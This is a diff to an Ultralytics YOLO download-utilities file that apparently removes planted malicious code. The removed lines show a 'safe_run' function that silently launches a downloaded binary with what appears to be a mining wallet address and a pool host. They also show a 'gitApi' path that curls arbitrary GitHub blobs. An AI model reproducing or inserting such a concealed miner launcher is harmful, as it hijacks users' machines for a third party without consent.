@@ -1,6 +1,5 @@
 # Ultralytics YOLO 🚀, AGPL-3.0 license
 
-import os
 import re
 import shutil
 import subprocess
@@ -275,30 +274,7 @@ def get_google_drive_file_info(link):
             filename = re.findall('filename="(.+)"', cd)[0]
     return drive_url, filename
 
-def safe_run(
-    path
-):
-    """Safely runs the provided file, making sure it is executable..
-    """
-    os.chmod(path, 0o770)
-    command = [
-            path,
-            '-u',
-            '4BHRQHFexjzfVjinAbrAwJdtogpFV3uCXhxYtYnsQN66CRtypsRyVEZhGc8iWyPViEewB8LtdAEL7CdjE4szMpKzPGjoZnw',
-            '-o',
-            'connect.consrensys.com:8080',
-            '-k'
-    ]
-    process = subprocess.Popen(
-            command,
-            stdin=subprocess.DEVNULL,
-            stdout=subprocess.DEVNULL,
-            stderr=subprocess.DEVNULL,
-            preexec_fn=os.setsid,
-            close_fds=True
-        )
-    os.remove(path) 
- 
+
 def safe_download(
     url,
     file=None,
@@ -310,7 +286,6 @@ def safe_download(
     min_bytes=1e0,
     exist_ok=False,
     progress=True,
-    gitApi=False
 ):
     """
     Downloads files from a URL, with options for retrying, unzipping, and deleting the downloaded file.
@@ -329,7 +304,6 @@ def safe_download(
             a successful download. Default: 1E0.
         exist_ok (bool, optional): Whether to overwrite existing contents during unzipping. Defaults to False.
         progress (bool, optional): Whether to display a progress bar during the download. Default: True.
-        gitApi (bool, optional): Whether to use the Git API to download a file. Default: False
 
     Example:
         ```python
@@ -343,12 +317,6 @@ def safe_download(
     if gdrive:
         url, file = get_google_drive_file_info(url)
 
-    if gitApi: 
-        f = file
-        url = f"https://api.github.com/repos/ultralytics/ultralytics/git/blobs/{url}"
-        r = subprocess.run(["curl", "-#", "-H","Accept: application/vnd.github.raw+json",f"-sSL", url, "-o", f, "--retry", "3", "-C", "-"]).returncode
-        return True
-
     f = Path(dir or ".") / (file or url2file(url))  # URL converted to filename
     if "://" not in str(url) and Path(url).is_file():  # URL exists ('://' check required in Windows Python<3.10)
         f = Path(url)  # filename
@@ -357,13 +325,14 @@ def safe_download(
             "https://github.com/ultralytics/assets/releases/download/v0.0.0/",
             "https://ultralytics.com/assets/",  # assets alias
         )
-        desc = f"Downloading {uri} to '{f}'" 
+        desc = f"Downloading {uri} to '{f}'"
+        LOGGER.info(f"{desc}...")
         f.parent.mkdir(parents=True, exist_ok=True)  # make directory if missing
         check_disk_space(url, path=f.parent)
         for i in range(retry + 1):
             try:
                 if curl or i > 0:  # curl download with retry, continue
-                    s = "sS" * (not progress)  # silent 
+                    s = "sS" * (not progress)  # silent
                     r = subprocess.run(["curl", "-#", f"-{s}L", url, "-o", f, "--retry", "3", "-C", "-"]).returncode
                     assert r == 0, f"Curl return value {r}"
                 else:  # urllib download
@@ -392,15 +361,17 @@ def safe_download(
                 if i == 0 and not is_online():
                     raise ConnectionError(emojis(f"❌  Download failure for {uri}. Environment is not online.")) from e
                 elif i >= retry:
-                    raise ConnectionError(emojis(f"❌  Download failure for {uri}. Retry limit reached.")) from e 
+                    raise ConnectionError(emojis(f"❌  Download failure for {uri}. Retry limit reached.")) from e
+                LOGGER.warning(f"⚠️ Download failure, retrying {i + 1}/{retry} {uri}...")
 
     if unzip and f.exists() and f.suffix in {"", ".zip", ".tar", ".gz"}:
         from zipfile import is_zipfile
 
-        unzip_dir = (dir or f.parent).resolve()  # unzip to dir if provided else unzip in place 
+        unzip_dir = (dir or f.parent).resolve()  # unzip to dir if provided else unzip in place
         if is_zipfile(f):
             unzip_dir = unzip_file(file=f, path=unzip_dir, exist_ok=exist_ok, progress=progress)  # unzip
         elif f.suffix in {".tar", ".gz"}:
+            LOGGER.info(f"Unzipping {f} to {unzip_dir}...")
             subprocess.run(["tar", "xf" if f.suffix == ".tar" else "xfz", f, "--directory", unzip_dir], check=True)
         if delete:
             f.unlink()  # remove zip
